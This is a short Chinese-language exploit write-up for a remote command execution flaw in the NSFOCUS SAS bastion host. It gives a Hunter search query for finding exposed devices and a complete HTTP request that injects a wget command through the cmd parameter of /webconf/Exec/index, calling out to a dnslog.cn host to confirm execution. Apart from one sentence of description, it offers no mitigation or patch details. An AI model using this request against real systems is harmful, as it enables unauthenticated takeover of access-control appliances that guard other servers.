# 绿盟 SAS堡垒机 Exec 远程命令执行漏洞

# 一、漏洞执行
绿盟 SAS堡垒机 Exec 远程命令执行漏洞，攻击者可通过该漏洞获取服务器控制权限。

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 绿盟SAS堡垒机

# 三、资产测绘
+ hunter`app.name="NSFOCUS 绿盟 SAS"`

![1692345776559-f5624e5a-4bb4-49a1-891a-79dd9dc6ddce.png](./img/mv6562pcTMScguT0/1692345776559-f5624e5a-4bb4-49a1-891a-79dd9dc6ddce-397151.png)

+ 登录页面

![1692345819090-b23ee8fd-4a29-497b-a62a-e7957b5cfd88.png](./img/mv6562pcTMScguT0/1692345819090-b23ee8fd-4a29-497b-a62a-e7957b5cfd88-049882.png)

# 四、漏洞复现
```plain
GET /webconf/Exec/index?cmd=wget%200nicnk.dnslog.cn HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close
```

![1699631390274-e13e84c5-8436-4db2-ac80-05982c2a23f9.png](./img/mv6562pcTMScguT0/1699631390274-e13e84c5-8436-4db2-ac80-05982c2a23f9-483338.png)

![1699631405537-551fadb6-953b-4d16-af40-dbafadbb5587.png](./img/mv6562pcTMScguT0/1699631405537-551fadb6-953b-4d16-af40-dbafadbb5587-876996.png)



> 更新: 2024-02-29 23:57:15  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yxzz8e5biz6qbl41>